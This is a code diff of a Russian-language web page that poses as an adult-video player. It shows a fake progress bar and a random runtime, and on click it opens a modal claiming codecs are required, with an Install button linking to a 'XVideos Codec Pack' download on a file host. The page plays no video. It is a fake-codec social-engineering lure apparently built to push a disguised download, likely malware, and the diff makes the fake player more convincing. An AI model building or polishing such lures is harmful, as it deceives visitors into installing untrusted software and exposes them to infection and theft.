@@ -14,14 +14,26 @@
       align-items: center;
       justify-content: center;
       font-family: "Segoe UI Variable", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      overflow: hidden;
     }
 
-    img {
-      max-width: 90vw;
-      max-height: 90vh;
+    .player {
+      position: relative;
+      width: 90vw;  /* Плеер будет занимать 90% ширины экрана */
+      height: 50vw; /* Высота будет зависеть от ширины */
+      max-width: 800px; /* Ограничиваем максимальную ширину */
+      max-height: 450px; /* Ограничиваем максимальную высоту */
+      background-color: #222;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+
+    .player img {
+      width: 100%;
+      height: 100%;  /* Заполнение всей высоты и ширины контейнера */
+      object-fit: cover;  /* Изображение будет обрезаться, чтобы заполнить контейнер */
       cursor: pointer;
-      user-select: none;
-      -webkit-user-drag: none;
     }
 
     /* Модальное окно */
@@ -33,18 +45,10 @@
       top: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(0,0,0,0.5);
-      backdrop-filter: blur(4px);
+      background-color: rgba(0, 0, 0, 0.7);
       align-items: center;
       justify-content: center;
       padding: 10px;
-      opacity: 0;
-      transition: opacity 0.3s ease;
-    }
-
-    .modal.show {
-      display: flex;
-      opacity: 1;
     }
 
     .modal-content {
@@ -57,18 +61,12 @@
       box-shadow: 0 8px 24px rgba(0,0,0,0.3);
       color: #000;
       font-size: 15px;
-      transform: scale(0.8);
-      transition: transform 0.3s ease;
-    }
-
-    .modal.show .modal-content {
-      transform: scale(1);
     }
 
     .modal-content .icon {
       font-size: 60px;
       color: #d93025;
-      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
       margin-bottom: 15px;
     }
 
@@ -87,43 +85,84 @@
       color: #fff;
       background-color: #0078d4;
       display: inline-block;
-      transition: background-color 0.2s, transform 0.1s;
     }
 
     .modal-buttons a:hover {
       background-color: #005a9e;
-      transform: translateY(-1px);
     }
 
-    .modal-buttons a:active {
-      transform: translateY(1px);
+    /* Элементы управления */
+    .controls {
+      position: absolute;
+      bottom: 10px;
+      left: 10px;
+      right: 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: white;
+      padding: 0 10px;
+      width: calc(100% - 20px); /* Подгонка по размеру */
     }
 
-    /* Полное скрытие Google Translate */
-    #google_translate_element,
-    .goog-te-banner-frame,
-    .goog-te-gadget-icon,
-    #goog-gt-tt,
-    .goog-te-balloon-frame,
-    .goog-te-menu-frame,
-    .goog-te-combo,
-    .goog-te-spinner-pos,
-    .goog-te-gadget,
-    .goog-te-banner,
-    .skiptranslate {
-      display: none !important;
-      visibility: hidden !important;
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background-color: #444;
+      border-radius: 4px;
+      cursor: pointer;
+      position: relative;
     }
 
-    body {
-      top: 0 !important; /* Убираем отступы после скрытия баннера */
+    .progress {
+      width: 0%;
+      height: 100%;
+      background-color: #0078d4;
+      border-radius: 4px;
+    }
+
+    .time {
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    /* Медиазапросы для мобильных устройств */
+    @media (max-width: 600px) {
+      .player {
+        width: 95vw;  /* Уменьшаем размер плеера для мобильных устройств */
+        height: 55vw; /* Высота пропорционально ширине */
+      }
+
+      .modal-content {
+        width: 80%;  /* Меньшая ширина модального окна */
+      }
+
+      .time {
+        font-size: 12px; /* Уменьшаем шрифт времени на мобильных */
+      }
+    }
+
+    @media (max-width: 400px) {
+      .time {
+        font-size: 10px; /* Уменьшаем шрифт времени на очень маленьких экранах */
+      }
     }
   </style>
 </head>
 <body>
 
-  <!-- Картинка-триггер -->
-  <img src="ai_bot.png" alt="AI Bot" id="trigger">
+  <!-- Плеер с изображением -->
+  <div class="player" id="player">
+    <img src="ai_bot.png" alt="AI Bot" id="trigger">
+
+    <!-- Элементы управления -->
+    <div class="controls">
+      <div class="progress-bar" id="progress-bar">
+        <div class="progress" id="progress"></div>
+      </div>
+      <div class="time" id="time">00:00 / 00:00</div>
+    </div>
+  </div>
 
   <!-- Модальное окно -->
   <div class="modal" id="modal">
@@ -131,54 +170,75 @@
       <div class="icon">⚠</div>
       <p id="modal-text">Для просмотра видео необходимо установить кодеки.</p>
       <div class="modal-buttons">
-        <a href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack" 
-           target="_blank" rel="noopener noreferrer">Установить</a>
+        <a href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack" target="_blank" rel="noopener noreferrer">Установить</a>
       </div>
     </div>
   </div>
 
-  <!-- Контейнер для Google Translate (скрыт) -->
-  <div id="google_translate_element"></div>
-
   <script>
     const trigger = document.getElementById('trigger');
+    const progressBar = document.getElementById('progress-bar');
+    const progress = document.getElementById('progress');
+    const timeDisplay = document.getElementById('time');
     const modal = document.getElementById('modal');
+
+    // Генерация случайного времени от 12:02 (722 секунды) до 25:48 (928 секунд)
+    function getRandomTime() {
+      const min = 722; // 12:02 в секундах
+      const max = 928; // 25:48 в секундах
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    const totalDuration = getRandomTime(); // Генерируем случайное время
+    let currentTime = 0;
+    let interval;
+
+    // Функция форматирования времени в строку MM:SS
+    function formatTime(seconds) {
+      const minutes = Math.floor(seconds / 60);
+      const remainingSeconds = seconds % 60;
+      return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
+    }
+
+    // Обновление времени и прогресса
+    function updateTime(seconds) {
+      timeDisplay.textContent = `${formatTime(seconds)} / ${formatTime(totalDuration)}`;
+      const progressWidth = (seconds / totalDuration) * 100;
+      progress.style.width = `${progressWidth}%`;
+    }
+
+    // Функция воспроизведения
+    function startProgress() {
+      interval = setInterval(() => {
+        if (currentTime < totalDuration) {
+          currentTime++;
+          updateTime(currentTime);
+        } else {
+          stopProgress();
+        }
+      }, 1000);
+    }
+
+    // Остановка воспроизведения
+    function stopProgress() {
+      clearInterval(interval);
+    }
 
     // Показ модального окна
     trigger.addEventListener('click', () => {
-      modal.classList.add('show');
+      modal.style.display = 'flex';
+      startProgress(); // Начинаем воспроизведение по клику на изображение
     });
 
-    // Автоматический выбор языка пользователя
-    function googleTranslateElementInit() {
-      new google.translate.TranslateElement({
-        pageLanguage: 'ru',
-        autoDisplay: false
-      }, 'google_translate_element');
-
-      const userLang = navigator.language || navigator.userLanguage;
-      const langCode = userLang.split('-')[0];
-
-      const interval = setInterval(() => {
-        const select = document.querySelector('.goog-te-combo');
-        if (select) {
-          select.value = langCode;
-          select.dispatchEvent(new Event('change'));
-          clearInterval(interval);
-        }
-      }, 500);
-    }
-
-    // Закрытие модального окна по клавише Esc (опционально)
-    document.addEventListener('keydown', (event) => {
-      if (event.key === "Escape") {
-        modal.classList.remove('show');
-      }
+    // Закрытие модального окна при клике на кнопку
+    const modalLink = document.querySelector('.modal-buttons a');
+    modalLink.addEventListener('click', () => {
+      modal.style.display = 'none';
     });
+
+    // Отображаем случайное время при загрузке
+    updateTime(0); // Начальное время = 0
   </script>
-
-  <!-- Скрипт перевода -->
-  <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
 </body>
 </html>
